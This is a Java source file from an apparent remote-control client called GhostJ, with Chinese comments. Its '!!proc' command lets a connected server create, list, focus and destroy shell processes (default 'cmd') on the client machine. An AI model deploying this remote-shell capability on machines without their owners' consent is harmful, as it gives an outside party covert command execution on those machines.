package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ProcessCmd;
import com.ghostj.util.TimeUtil;

/**
 * 增删改查每个命令行执行对象的指令
 * @author Rock Chin
 */
public class FuncProcess implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!proc";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<oper> [params]"};
    }

    @Override
    public String getDescription() {
        return "操作被该客户端发起的命令行操作";
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        oper:switch (params[0]){
            // FIXME: 2020/9/6 所有的执行完毕的操作放到switch后面
            case "focus":{
                if(params.length<2){
                    HandleConn.writeToServer("proc focus命令语法不正确.\n");
                    break;
                }
                for(String key:FuncDefault.processList.keySet()){
                    if(key.startsWith(params[1])){
                        FuncDefault.focusedProcess=FuncDefault.processList.get(key);
                        HandleConn.writeToServer("聚焦process:"+key+"\n");
                        break oper;
                    }
                }
                HandleConn.writeToServer("找不到"+params[1]+"开头的process\n");
                break oper;
            }
            case "ls":{
                new Thread(()-> {
                    try {
                        HandleConn.writeToServer("列表所有此客户端已连接的process(" + FuncDefault.processList.size()
                                + ")\nkey\tinitCmd\tstartTime\tstate\n");
                        for (String key :FuncDefault.processList.keySet()) {
                            HandleConn.writeToServer(key + "      " + FuncDefault.processList.get(key).cmd + "         "
                                    + TimeUtil.millsToMMDDHHmmSS(FuncDefault.processList.get(key).startTime) + "   " + (FuncDefault.focusedProcess == FuncDefault.processList.get(key)) + "\n");
                        }
                        HandleConn.writeToServer("列表完成.\n");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();
                break oper;
            }
            case "new":{
                if(params.length<2){
                    HandleConn.writeToServer("proc new命令语法不正确.\n");
                    break oper;
                }
                HandleConn.writeToServer("新建进程:"+params[1]+"\n");
                ProcessCmd processCmd;
                if(params.length>=3){//如果有初始执行指令
                    processCmd = new ProcessCmd(params[1]);
                    processCmd.cmd = params[2];
                    FuncDefault.processList.put(params[1],processCmd);
                    processCmd.start();
                }else {
                    processCmd = new ProcessCmd(params[1]);
                    processCmd.cmd ="cmd";
                    FuncDefault.processList.put(params[1],processCmd);
                    processCmd.start();
                }
                FuncDefault.focusedProcess=FuncDefault.processList.get(params[1]);
                HandleConn.writeToServer("聚焦process:"+params[1]+"\n");
                break oper;
            }
            case "disc":{
                if(params.length<2){
                    HandleConn.writeToServer("proc disc命令语法不正确.\n");
                    break oper;
                }
                //注意！！这里仅仅是断开与进程的连接而不是结束进程
                if(FuncDefault.processList.containsKey(params[1])){
                    try {
                        FuncDefault.processList.get(params[1]).process.destroy();
                        FuncDefault.removeProcess(params[1]);
                    }catch (Exception e){
                        HandleConn.writeToServer("断连process时出现错误\n"+ ClientMain.getErrorInfo(e));
                    }
                }else {
                    HandleConn.writeToServer("仅能使用全名来断连process\n");
                }
                break oper;
            }
            default:{
                HandleConn.writeToServer("!!proc 命令语法不正确\n");
                break oper;
            }
        }
        HandleConn.sendFinishToServer();
    }
}
